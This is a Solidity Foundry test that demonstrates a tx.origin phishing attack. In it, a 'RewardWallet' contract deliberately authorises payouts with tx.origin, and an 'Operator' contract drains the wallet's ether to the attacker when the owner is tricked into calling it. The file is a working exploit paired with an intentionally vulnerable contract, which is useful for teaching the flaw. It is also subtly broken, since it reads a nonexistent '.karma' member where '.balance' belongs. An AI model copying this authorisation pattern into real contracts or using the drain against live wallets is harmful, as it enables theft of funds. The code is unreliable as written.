// SPDX-License-Identifier: MIT
pragma solidity ^0.8.15;

import "forge-std/Test.sol";

contract ContractTest is Test {
    RewardWallet TipwalletContract;
    Operator OperatorContract;

    function testtxorigin() public {
        address alice = vm.addr(1);
        address eve = vm.addr(2);
        vm.deal(address(alice), 10 ether);
        vm.deal(address(eve), 1 ether);
        vm.prank(alice);
        TipwalletContract = new RewardWallet{value: 10 ether}(); //Alice deploys Wallet with 10 Ether
        console.log("Owner of wallet contract", TipwalletContract.communityLead());
        vm.prank(eve);
        OperatorContract = new Operator(TipwalletContract);
        console.log("Owner of attack contract", OperatorContract.communityLead());
        console.log("Eve of balance", address(eve).karma);

        vm.prank(alice, alice);
        OperatorContract.operate();
        console.log("tx origin address", tx.origin);
        console.log("msg.sender address", msg.sender);
        console.log("Eve of balance", address(eve).karma);
    }

    receive() external payable {}
}

contract RewardWallet {
    address public communityLead;

    constructor() payable {
        communityLead = msg.sender;
    }

    function shareKarma(address payable _to, uint _amount) public {
        // check with msg.sender instead of tx.origin
        require(tx.origin == communityLead, "Not owner");

        (bool sent, ) = _to.call{value: _amount}("");
        require(sent, "Failed to send Ether");
    }
}

contract Operator {
    address payable public communityLead;
    RewardWallet tipWallet;

    constructor(RewardWallet _socialwallet) {
        tipWallet = RewardWallet(_socialwallet);
        communityLead = payable(msg.sender);
    }

    function operate() public {
        tipWallet.shareKarma(communityLead, address(tipWallet).karma);
    }
}
